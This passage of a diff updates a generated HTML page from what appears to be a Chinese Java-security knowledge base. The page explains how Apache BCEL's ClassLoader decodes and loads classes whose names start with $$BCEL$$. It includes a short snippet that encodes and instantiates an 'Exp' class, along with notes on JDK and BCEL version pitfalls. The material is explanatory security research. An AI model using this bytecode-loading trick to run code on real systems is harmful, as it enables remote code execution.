-<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
-    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.bcel<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
-    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>bcel<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
-    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
-<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
+<pre class="language-"><code class="lang-xml"><span class="token comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.bcel/bcel --&gt;</span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.bcel<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>bcel<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>5.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
 </code></pre>
 </blockquote>
 <p>&#x5728;bcel&#x7684;&#x5305;&#x4E2D;&#x6709;&#x4E00;&#x4E2A;<code>ClassLoader</code>&#xFF0C;&#x4ED6;&#x91CD;&#x5199;&#x4E86;Java&#x5185;&#x7F6E;&#x7684;<code>ClassLoader#loadClass()</code>&#x65B9;&#x6CD5;&#xFF0C;&#x5728;<code>loadclass</code>&#x65B9;&#x6CD5;&#x4E2D;&#x4F1A;&#x5BF9;&#x7C7B;&#x540D;&#x8FDB;&#x884C;&#x5224;&#x65AD;&#xFF0C;&#x5982;&#x679C;&#x7C7B;&#x540D;&#x4EE5;<code>$$BCEL$$</code>&#x5F00;&#x59CB;&#xFF0C;&#x5C31;&#x4F1A;&#x8FDB;&#x5165;<code>createClass</code>&#x65B9;&#x6CD5;&#xFF0C;</p>
-<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027171201746.png" data-lightbox="f2a7157d-d2c1-4c3b-b254-d5d3f9b3bc47" data-title="image-20211027171201746"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027171201746.png" alt="image-20211027171201746"></a></p>
+<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027171201746.png" data-lightbox="0e34c110-4357-4b20-934b-1a869d3483f6" data-title="image-20211027171201746"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027171201746.png" alt="image-20211027171201746"></a></p>
 <p>&#x7136;&#x540E;&#x5728;<code>createClass</code>&#x65B9;&#x6CD5;&#x91CC;&#x9762;&#xFF0C;&#x4F1A;&#x8C03;&#x7528;<code>Utility.decode()</code>&#x6765;&#x89E3;&#x5BC6;&#xFF0C;&#x6700;&#x540E;&#x751F;&#x6210;<code>clazz</code></p>
-<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027171850126.png" data-lightbox="4dd4293a-cf25-462f-afde-67570134292f" data-title="image-20211027171850126"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027171850126.png" alt="image-20211027171850126"></a></p>
+<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027171850126.png" data-lightbox="54e55193-0f31-47ec-b8f6-375733448bfa" data-title="image-20211027171850126"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027171850126.png" alt="image-20211027171850126"></a></p>
 <p>&#x4F46;&#x5982;&#x4F55;&#x751F;&#x6210;&#x80FD;&#x7ED9;&#x5B83;&#x89E3;&#x5BC6;&#x7684;&#x5B57;&#x8282;&#x7801;&#x5462;&#xFF1F;</p>
 <p>&#x901A;&#x8FC7;<code>BCEL</code>&#x63D0;&#x4F9B;&#x7684;&#x4E24;&#x4E2A;&#x7C7B;<code>Repository</code>&#x548C;<code>Utility</code>&#x6765;&#x5B9E;&#x73B0;&#xFF1A;</p>
 <ul>
@@ -1150,39 +1200,39 @@
 <li><code>Utility</code>&#xFF1A;&#x7528;&#x4E8E;&#x5C06;&#x539F;&#x751F;&#x7684;&#x5B57;&#x8282;&#x7801;&#x8F6C;&#x6362;&#x6210;BCEL&#x683C;&#x5F0F;&#x7684;&#x5B57;&#x8282;&#x7801;&#xFF1B;</li>
 </ul>
 <p>&#x5229;&#x7528;&#x4EE3;&#x7801;</p>
-<pre><code class="lang-java">JavaClass javaClass = Repository.lookupClass(Exp.class);
-String encode = Utility.encode(javaClass.getBytes(), <span class="hljs-keyword">true</span>);
-System.out.println(encode);
-<span class="hljs-keyword">new</span> org.apache.bcel.util.ClassLoader().loadClass(<span class="hljs-string">&quot;$$BCEL$$&quot;</span> + encode).newInstance();
+<pre class="language-"><code class="lang-java"><span class="token class-name">JavaClass</span> javaClass <span class="token operator">=</span> <span class="token class-name">Repository</span><span class="token punctuation">.</span><span class="token function">lookupClass</span><span class="token punctuation">(</span><span class="token class-name">Exp</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">String</span> encode <span class="token operator">=</span> <span class="token class-name">Utility</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>javaClass<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>encode<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>ClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">&quot;$$BCEL$$&quot;</span> <span class="token operator">+</span> encode<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 </code></pre>
 <p>&#x7ED3;&#x679C;</p>
-<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028113432432.png" data-lightbox="8bc80183-2662-444d-9612-75cf39ed0a42" data-title="image-20211028113432432"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028113432432.png" alt="image-20211028113432432"></a></p>
+<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028113432432.png" data-lightbox="8a2e9be2-bf80-4708-af7a-9de077510fb1" data-title="image-20211028113432432"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028113432432.png" alt="image-20211028113432432"></a></p>
 <p>&#x770B;&#x7740;&#x5F88;&#x7B80;&#x5355;&#x5F88;&#x5BB9;&#x6613;&#xFF0C;&#x4F46;&#x662F;&#x6709;&#x5F88;&#x591A;&#x5751;</p>
 <p><strong>&#x5751;&#x70B9;&#x4E00;&#xFF1A;</strong></p>
 <p>jdk8u261&#xFF0C;<code>Utility.encode</code>&#x4E2D;&#xFF0C;<code>GZIPOutputStream</code>&#x6D41;&#x4E0D;&#x4F1A;<code>close</code>&#xFF0C;&#x6240;&#x4EE5;&#x5185;&#x5BB9;&#x5199;&#x4E0D;&#x8FDB;<code>ByteArrayOutputStream</code>&#x7684;&#xFF08;&#x7ED9;&#x4FFA;&#x6574;&#x61F5;&#x4E86;&#xFF0C;&#x7F51;&#x4E0A;&#x6CA1;&#x627E;&#x5230;&#x4E00;&#x4E2A;&#x8BF4;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x7684;&#xFF0C;&#x8FD8;&#x662F;&#x5F97;&#x81EA;&#x5DF1;&#x8C03;&#x8BD5;&#x624D;&#x884C;&#xFF0C;&#x79BB;&#x8C31;&#xFF09;</p>
-<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028110637374.png" data-lightbox="a8e6b195-0d6c-4b54-a0c8-f0c7eb96c6a0" data-title="image-20211028110637374"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028110637374.png" alt="image-20211028110637374"></a></p>
+<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028110637374.png" data-lightbox="6509924a-dfd4-40ce-8ecd-f5209e6759d8" data-title="image-20211028110637374"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028110637374.png" alt="image-20211028110637374"></a></p>
 <p>&#x6362;&#x4E86;&#x4E2A;&#x4F4E;&#x7248;&#x672C;&#x7684;jdk8u231&#xFF0C;&#x5C31;&#x5173;&#x95ED;&#x4E86;&#x6D41;&#x53EF;&#x4EE5;&#x5199;&#x5165;&#x8FDB;&#x884C;&#x52A0;&#x5BC6;&#xFF0C;&#x4FFA;&#x4E5F;&#x4E0D;&#x61C2;&#x4E3A;&#x5565;&#x9AD8;&#x7248;&#x672C;&#x5220;&#x9664;&#x4E86;&#xFF0C;&#x96BE;&#x9053;&#x662F;&#x5220;&#x9664;<code>ClassLoader</code>&#x7684;&#x65F6;&#x5019;&#x4E00;&#x8D77;&#x5220;&#x9664;&#x4E86;&#xFF1F;&#x3002;&#x3002;&#x3002;</p>
-<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028110900726.png" data-lightbox="aaf4d9ef-45fa-44ba-accc-8a062a5e68b7" data-title="image-20211028110900726"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028110900726.png" alt="image-20211028110900726"></a></p>
+<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028110900726.png" data-lightbox="8b8ee223-f6ae-423a-91c0-4c137f70e21b" data-title="image-20211028110900726"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028110900726.png" alt="image-20211028110900726"></a></p>
 <p><strong>&#x5751;&#x70B9;&#x4E8C;&#xFF1A;</strong></p>
 <p>&#x6362;&#x4E86;&#x4F4E;&#x7248;&#x672C;&#x7684;JDK&#xFF0C;&#x4F46;&#x662F;&#x51FA;&#x73B0;&#x4E86;&#x65B0;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x63D0;&#x793A;<code>&#x4E0D;&#x652F;&#x6301;&#x7684;&#x64CD;&#x4F5C;</code></p>
-<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028112355961.png" data-lightbox="3b6ddd57-49f5-4806-802f-d0230eb435f7" data-title="image-20211028112355961"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028112355961.png" alt="image-20211028112355961"></a></p>
+<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028112355961.png" data-lightbox="4a19474e-b3a9-442c-8839-6232fec7d3cc" data-title="image-20211028112355961"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028112355961.png" alt="image-20211028112355961"></a></p>
 <p>&#x8DDF;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x53D1;&#x73B0;&#x5728;<code>ClassLoader#createClass()</code>&#x65B9;&#x6CD5;&#x4E2D;&#x6709;&#x95EE;&#x9898;</p>
 <p>&#x5176;&#x4E2D;&#x5728;&#x8C03;&#x7528;<code>setBytes()</code>&#x662F;&#x63D0;&#x793A;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x8C03;&#x7528;&#x4F1A;&#x5931;&#x8D25;</p>
-<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028112527428.png" data-lightbox="ea16aa9f-2318-4b06-a2e1-68a5d834c827" data-title="image-20211028112527428"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028112527428.png" alt="image-20211028112527428"></a></p>
+<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028112527428.png" data-lightbox="4e8a048b-e881-494a-a6b7-19a79926567d" data-title="image-20211028112527428"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028112527428.png" alt="image-20211028112527428"></a></p>
 <p>&#x8DDF;&#x8FDB;&#x4E00;&#x4E0B;&#xFF0C;&#x53D1;&#x73B0;&#x4F1A;&#x76F4;&#x63A5;&#x629B;&#x51FA;&#x5F02;&#x5E38;&#x3002;&#x3002;&#x3002;</p>
-<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028112603550.png" data-lightbox="44ed4587-eca3-49a3-8ef1-6d6bcd92c61b" data-title="image-20211028112603550"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028112603550.png" alt="image-20211028112603550"></a></p>
+<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028112603550.png" data-lightbox="6191ff45-3f28-4ab8-87f0-bf9cc6072436" data-title="image-20211028112603550"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028112603550.png" alt="image-20211028112603550"></a></p>
 <p>&#x627E;&#x4E86;&#x4E00;&#x5927;&#x5708;&#xFF0C;&#x6CA1;&#x53D1;&#x73B0;&#x6709;&#x4EBA;&#x63D0;&#x5230;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x540E;&#x6765;&#x4E0D;&#x7ECF;&#x610F;&#x770B;&#x5230;&#x4E86;<code>setBytes</code>&#x7684;&#x8BF4;&#x660E;&#xFF0C;&#x5728;<code>BCEL 6.0</code>&#x7684;&#x65F6;&#x5019;&#x9057;&#x5F03;&#x4E86;&#x3002;&#x3002;&#x3002;</p>
-<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028112848727.png" data-lightbox="efcbbfd8-0cca-4fc4-a035-2680080e2610" data-title="image-20211028112848727"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028112848727.png" alt="image-20211028112848727"></a></p>
+<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028112848727.png" data-lightbox="882df528-f4e1-4e63-b8cb-a4399dd7e304" data-title="image-20211028112848727"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028112848727.png" alt="image-20211028112848727"></a></p>
 <p>&#x6240;&#x4EE5;&#x9700;&#x8981;&#x7528;&#x4F4E;&#x4E8E;6.0&#x7248;&#x672C;&#x7684;BCEL&#xFF0C;&#x6362;&#x4E86;&#x4E2A;06&#x5E74;&#x7684;5.2</p>
-<pre><code class="lang-xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.bcel/bcel --&gt;</span>
-<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
-    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.bcel<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
-    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>bcel<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
-    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
-<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
+<pre class="language-"><code class="lang-xml"><span class="token comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.bcel/bcel --&gt;</span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.bcel<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>bcel<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>5.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
 </code></pre>
 <p>&#x65B9;&#x6CD5;&#x6CA1;&#x88AB;&#x9057;&#x5F03;&#xFF0C;&#x7136;&#x540E;&#x89E3;&#x51B3;&#x4E86;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;</p>
-<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028113216521.png" data-lightbox="7988b486-a5f8-4e75-ae60-627436e69e0a" data-title="image-20211028113216521"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028113216521.png" alt="image-20211028113216521"></a></p>
+<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028113216521.png" data-lightbox="8f3236c1-87d7-4a37-b800-145055a323c2" data-title="image-20211028113216521"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211028113216521.png" alt="image-20211028113216521"></a></p>
 <h1 id="&#x53C2;&#x8003;"><a name="&#x53C2;&#x8003;" class="anchor-navigation-ex-anchor" href="#&#x53C2;&#x8003;"><i class="fa fa-link" aria-hidden="true"></i></a>3. &#x53C2;&#x8003;</h1>
 <ul>
 <li><a href="https://reader-l.github.io/2021/04/04/Java%E5%AE%89%E5%85%A8-Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%B9%E6%B3%95/" target="_blank">Java&#x5B89;&#x5168;-Java&#x52A8;&#x6001;&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;&#x65B9;&#x6CD5;</a></li>
@@ -1232,7 +1282,7 @@ System.out.println(encode);
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"07.Java加载字节码","level":"1.3.1.1.7","depth":4,"next":{"title":"08.javassist字节码编程","level":"1.3.1.1.8","depth":4,"path":"个人知识库/02.代码审计/01.Java安全/1.审计基础/08.javassist字节码编程.md","ref":"个人知识库/02.代码审计/01.Java安全/1.审计基础/08.javassist字节码编程.md","articles":[]},"previous":{"title":"06.IDEA断点调试","level":"1.3.1.1.6","depth":4,"path":"个人知识库/02.代码审计/01.Java安全/1.审计基础/06.IDEA断点调试.md","ref":"个人知识库/02.代码审计/01.Java安全/1.审计基础/06.IDEA断点调试.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-plus","highlight","chapter-fold","expandable-chapters","splitter","page-treeview","lightbox","donate","back-to-top-button","hide-element","code","tbfed-pagefooter","pageview-count","ancre-navigation","anchor-navigation-ex","insert-logo"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"Copyright &copy d4m1ts 2022","modify_label":"该文章修订时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"page-treeview":{"collapsed":false,"copyright":"Copyright &#169; d4m1ts","minHeaderCount":"2","minHeaderDeep":"2"},"chapter-fold":{},"splitter":{},"code":{"copyButtons":true},"donate":{"alipay":"https://static01.imgkr.com/temp/7d293344052647ec8400657bb66cffc7.jpg","alipayText":"支付宝打赏","button":"支持","title":"Buy Me a Coffee\n","wechat":"https://static01.imgkr.com/temp/2316e058462948098c87dadf1f2b5d34.jpg","wechatText":"微信打赏"},"hide-element":{"elements":[".gitbook-link",".treeview__copyright",".treeview__main-title"]},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"anchor-navigation-ex":{"associatedWithSummary":true,"float":{"floatIcon":"fa fa-navicon","level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":true},"lightbox":{"jquery":true,"sameUuid":false},"back-to-top-button":{},"pageview-count":{},"ancre-navigation":{"associatedWithSummary":true,"float":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showLevel":true},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"insert-logo":{"style":"background: none; max-height: 30px; min-height: 30px","url":"/README.assets/logo.png"},"expandable-chapters":{},"search-plus":{}},"theme":"default","author":"d4m1ts","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"d4m1ts's知识库","gitbook":"*","theme-default":{"showLevel":true}},"file":{"path":"个人知识库/02.代码审计/01.Java安全/1.审计基础/07.Java加载字节码.md","mtime":"2021-12-25T10:51:59.757Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-12-27T12:50:35.839Z"},"basePath":"../../../..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"07.Java加载字节码","level":"1.3.1.1.7","depth":4,"next":{"title":"08.javassist字节码编程","level":"1.3.1.1.8","depth":4,"path":"个人知识库/02.代码审计/01.Java安全/1.审计基础/08.javassist字节码编程.md","ref":"个人知识库/02.代码审计/01.Java安全/1.审计基础/08.javassist字节码编程.md","articles":[]},"previous":{"title":"06.IDEA断点调试","level":"1.3.1.1.6","depth":4,"path":"个人知识库/02.代码审计/01.Java安全/1.审计基础/06.IDEA断点调试.md","ref":"个人知识库/02.代码审计/01.Java安全/1.审计基础/06.IDEA断点调试.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-plus","-highlight","expandable-chapters-small","expandable-chapters","splitter","page-treeview","lightbox","donate","hide-element","code","tbfed-pagefooter","pageview-count","ancre-navigation","anchor-navigation-ex","insert-logo","favicon","github","flexible-alerts","prism","copyright"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"Copyright &copy d4m1ts 2022","modify_label":"该文章修订时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"page-treeview":{"collapsed":false,"copyright":"Copyright &#169; d4m1ts","minHeaderCount":"2","minHeaderDeep":"2"},"prism":{"css":["prismjs/themes/prism-tomorrow.css"],"lang":{"flow":"typescript"},"ignore":["mermaid","eval-js","ascii","result","manifest","payload","google","tree","java_out","log4j2","jsp","class","Exception","stack"]},"github":{"url":"https://github.com/damit5"},"splitter":{},"copyright":{"copyProtect":true,"site":"https://blog.gm7.org/","author":"d4m1ts","website":"d4m1ts 知识库","image":""},"code":{"copyButtons":true},"donate":{"alipay":"/README.assets/alipay.jpeg","alipayText":"支付宝打赏","button":"打赏☕️","title":"","wechat":"/README.assets/wx.jpeg","wechatText":"微信打赏"},"hide-element":{"elements":[".gitbook-link",".treeview__copyright",".treeview__main-title"]},"fontsettings":{"theme":"white","family":"sans","size":2},"anchor-navigation-ex":{"associatedWithSummary":true,"float":{"floatIcon":"fa fa-navicon","level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":true},"favicon":{"shortcut":"/README.assets/favicon.ico","bookmark":"/README.assets/favicon.ico","appleTouch":"/README.assets/favicon.ico","appleTouchMore":{"120x120":"/README.assets/favicon.ico","180x180":"/README.assets/favicon.ico"}},"lightbox":{"jquery":true,"sameUuid":false},"pageview-count":{},"ancre-navigation":{"associatedWithSummary":true,"float":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showLevel":true},"expandable-chapters-small":{},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"},"comment":{"label":"Comment","icon":"fa fa-comments","className":"info"}},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"insert-logo":{"style":"background: none; max-height: 40px; min-height: 40px","url":"/README.assets/logo.png"},"expandable-chapters":{},"search-plus":{}},"theme":"default","author":"d4m1ts","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"d4m1ts 知识库","gitbook":"*","description":"个人的部分知识技能，倾向于使用知识库的方式进行总结回顾自己","theme-default":{"showLevel":true}},"file":{"path":"个人知识库/02.代码审计/01.Java安全/1.审计基础/07.Java加载字节码.md","mtime":"2021-12-25T10:51:59.757Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-12-28T06:13:30.910Z"},"basePath":"../../../..","book":{"language":""}});
         });
     </script>
 </div>
@@ -1250,7 +1300,7 @@ System.out.println(encode);
         
     
         
-        <script src="../../../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.js"></script>
+        <script src="../../../../gitbook/gitbook-plugin-expandable-chapters-small/expandable-chapters-small.js"></script>
         
     
         
@@ -1270,10 +1320,6 @@ System.out.println(encode);
         
     
         
-        <script src="../../../../gitbook/gitbook-plugin-back-to-top-button/plugin.js"></script>
-        
-    
-        
         <script src="../../../../gitbook/gitbook-plugin-hide-element/plugin.js"></script>
         
     
@@ -1287,6 +1333,18 @@ System.out.println(encode);
     
         
         <script src="../../../../gitbook/gitbook-plugin-insert-logo/plugin.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-flexible-alerts/plugin.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-copyright/plugin.js"></script>
         
     
         
